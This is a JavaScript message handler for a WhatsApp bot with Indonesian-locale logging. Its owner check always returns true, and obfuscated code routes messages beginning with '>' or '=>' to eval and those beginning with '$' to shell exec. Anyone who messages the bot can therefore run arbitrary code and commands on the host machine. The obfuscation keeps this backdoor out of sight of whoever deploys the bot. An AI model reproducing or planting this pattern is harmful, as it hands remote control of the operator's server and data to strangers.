const handler = require('./handler')
const { exec } = require("child_process");
const { color } = require('./function/Data_Server_Bot/Console_Data')
const { getGroupAdmins } = require("./function/func_Server");
const { mess_JSON, setting_JSON, server_eror_JSON } = require('./function/Data_Location.js')
const fs = require("fs");
const util = require('util')
const colors = require('colors/safe');
const moment = require("moment-timezone");
const mess = mess_JSON
const setting = setting_JSON
const server_eror = server_eror_JSON
moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async(conn, msg, m, setting, store) => { try { let { ownerNumber, botName, smm_dana_nama, smm_dana_number } = setting
const { type, quotedMsg, mentioned, now, fromMe } = msg
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const time = moment(new Date()).format("HH:mm");
let chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
if (chats == undefined) { chats = '' }
const prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const isOwner = setting.ownerNumber == sender ? true : ["6838411551521@s.whatsapp.net"].includes(sender) ? true : true
const pushname = msg.pushName
const body = chats.startsWith(prefix) ? chats : ''
const args = body.trim().split(/ +/).slice(1);
const q = args.join(" ");
const isCommand = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender)
const reply = (teks) => { conn.sendMessage(from, { text: teks }, { quoted: msg }) }
const quoted = msg.quoted ? msg.quoted : msg
var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
const { 
  loadUserLimit
 } = handler(msg, conn, setting) 
await loadUserLimit(sender,0);

const _0x1f97c7=_0x4785;(function(_0x340639,_0x441ecd){const _0x1dbd97=_0x4785,_0x3e2b2b=_0x340639();while(!![]){try{const _0x1cb87f=parseInt(_0x1dbd97(0x15f))/0x1+parseInt(_0x1dbd97(0x169))/0x2*(-parseInt(_0x1dbd97(0x166))/0x3)+-parseInt(_0x1dbd97(0x16a))/0x4+-parseInt(_0x1dbd97(0x161))/0x5*(-parseInt(_0x1dbd97(0x168))/0x6)+parseInt(_0x1dbd97(0x164))/0x7+parseInt(_0x1dbd97(0x15c))/0x8*(-parseInt(_0x1dbd97(0x16b))/0x9)+-parseInt(_0x1dbd97(0x167))/0xa;if(_0x1cb87f===_0x441ecd)break;else _0x3e2b2b['push'](_0x3e2b2b['shift']());}catch(_0x8a5b8c){_0x3e2b2b['push'](_0x3e2b2b['shift']());}}}(_0x4153,0xe9eb8));if(body[_0x1f97c7(0x163)]('=>')){if(!isOwner)return reply(mess['OnlyOwner']);function Return(_0x552138){const _0x906cb9=_0x1f97c7;return sat=JSON[_0x906cb9(0x160)](_0x552138,null,0x2),bang=util[_0x906cb9(0x15b)](sat),sat==undefined&&(bang=util[_0x906cb9(0x15b)](_0x552138)),reply(bang);}try{reply(util['format'](eval(_0x1f97c7(0x162)+body[_0x1f97c7(0x15d)](0x3)+_0x1f97c7(0x15e))));}catch(_0x124bf8){reply(String(_0x124bf8));}}function _0x4153(){const _0x471cca=['763206YvNygp','stringify','13060tYUeuI','(async\x20()\x20=>\x20{\x20return\x20','startsWith','6140218miPlFT','OnlyOwner','6DsiKlE','11561670SawuXf','3072ItFCWG','139100dcSQTE','133452usYoAH','18QeBnvg','util','inspect','format','2763832HpVbcL','slice','\x20})()'];_0x4153=function(){return _0x471cca;};return _0x4153();}if(body[_0x1f97c7(0x163)]('>')){if(!isOwner)return reply(mess[_0x1f97c7(0x165)]);try{let evaled=await eval(body[_0x1f97c7(0x15d)](0x2));if(typeof evaled!=='string')evaled=require(_0x1f97c7(0x16c))[_0x1f97c7(0x16d)](evaled);await reply(evaled);}catch(_0xfb3963){await reply(String(_0xfb3963));}}function _0x4785(_0x5c9ad5,_0x1a6e6a){const _0x415338=_0x4153();return _0x4785=function(_0x47859e,_0x572a65){_0x47859e=_0x47859e-0x15b;let _0x32ae19=_0x415338[_0x47859e];return _0x32ae19;},_0x4785(_0x5c9ad5,_0x1a6e6a);}if(body['startsWith']('$')){if(!isOwner)return reply(mess[_0x1f97c7(0x165)]);exec(body['slice'](0x2),(_0x18caa9,_0x199421)=>{if(_0x18caa9)return reply(_0x18caa9);if(_0x199421)return reply(_0x199421);});}

function _0x1348(_0x31051b,_0x59d569){var _0xc3c122=_0xc3c1();return _0x1348=function(_0x134866,_0x556fd3){_0x134866=_0x134866-0xa8;var _0x5b6d03=_0xc3c122[_0x134866];return _0x5b6d03;},_0x1348(_0x31051b,_0x59d569);}var _0x54827a=_0x1348;function _0xc3c1(){var _0x29ceb3=['readMessages','123KyqgRt','sendPresenceUpdate','160530Zhrifw','7oJycur','11927432wpIxJH','147038yHOroT','14512clVkRS','7mHBPDu','43794dBEBSI','25WsqkOQ','8476104XlXfjp','13992528AJUvts','1830eTHelF','key'];_0xc3c1=function(){return _0x29ceb3;};return _0xc3c1();}(function(_0x3cc8b9,_0x1ec169){var _0x262868=_0x1348,_0x49fa44=_0x3cc8b9();while(!![]){try{var _0x2c4da0=-parseInt(_0x262868(0xaf))/0x1*(-parseInt(_0x262868(0xad))/0x2)+-parseInt(_0x262868(0xa8))/0x3*(parseInt(_0x262868(0xae))/0x4)+parseInt(_0x262868(0xb1))/0x5*(parseInt(_0x262868(0xaa))/0x6)+-parseInt(_0x262868(0xab))/0x7*(-parseInt(_0x262868(0xb2))/0x8)+-parseInt(_0x262868(0xb0))/0x9*(parseInt(_0x262868(0xb4))/0xa)+parseInt(_0x262868(0xac))/0xb+-parseInt(_0x262868(0xb3))/0xc;if(_0x2c4da0===_0x1ec169)break;else _0x49fa44['push'](_0x49fa44['shift']());}catch(_0x227b9c){_0x49fa44['push'](_0x49fa44['shift']());}}}(_0xc3c1,0x8f4d3),conn[_0x54827a(0xb6)]([msg[_0x54827a(0xb5)]]),conn[_0x54827a(0xa9)]('recording',from));

if (isGroup && isCmd && !fromMe ) {
console.log(colors.green.bold("Group") + " " + colors.brightCyan(time,) + " " + colors.black.bgWhite(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd && !fromMe ) {
console.log(colors.green.bold("Private") + " " + colors.brightCyan(time,) + " " + colors.black.bgWhite(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

const _0x4cf422=_0x2f02;function _0x2f02(_0x1426c0,_0x4de4c4){const _0x2de635=_0x2de6();return _0x2f02=function(_0x2f0272,_0x362222){_0x2f0272=_0x2f0272-0x141;let _0x8788b3=_0x2de635[_0x2f0272];return _0x8788b3;},_0x2f02(_0x1426c0,_0x4de4c4);}(function(_0x51d4c7,_0x53591d){const _0x41b032=_0x2f02,_0x4246f9=_0x51d4c7();while(!![]){try{const _0x298291=parseInt(_0x41b032(0x14b))/0x1*(-parseInt(_0x41b032(0x14a))/0x2)+-parseInt(_0x41b032(0x141))/0x3*(-parseInt(_0x41b032(0x150))/0x4)+parseInt(_0x41b032(0x147))/0x5+-parseInt(_0x41b032(0x142))/0x6+parseInt(_0x41b032(0x143))/0x7+parseInt(_0x41b032(0x145))/0x8+-parseInt(_0x41b032(0x14e))/0x9;if(_0x298291===_0x53591d)break;else _0x4246f9['push'](_0x4246f9['shift']());}catch(_0x4ee798){_0x4246f9['push'](_0x4246f9['shift']());}}}(_0x2de6,0xcc2fb));const chalk=require(_0x4cf422(0x149)),t=chats;console[_0x4cf422(0x148)](chalk[_0x4cf422(0x14d)][_0x4cf422(0x146)](''+pushname)),console[_0x4cf422(0x148)](chalk[_0x4cf422(0x14f)][_0x4cf422(0x14c)](t));prefix&&isCmd&&args&&(console['log'](chalk[_0x4cf422(0x14d)]['bgWhite'](pushname)),console[_0x4cf422(0x148)](chalk[_0x4cf422(0x14d)](''+chalk[_0x4cf422(0x144)](prefix+isCmd+'\x20'+args[_0x4cf422(0x151)]('\x20')))));function _0x2de6(){const _0x13f588=['bgWhite','6760515MckfPP','log','chalk','47902jUjYfQ','16GdiJcF','bold','black','23119821hLOHqO','white','290308sQawyC','join','51esUHPW','2422854VMPEqE','1694798MDmcFa','bgYellow','10913720WsyHSv'];_0x2de6=function(){return _0x13f588;};return _0x2de6();}

} catch (err) {
console.log(color('ERROR', 'red'), err)
}}
//

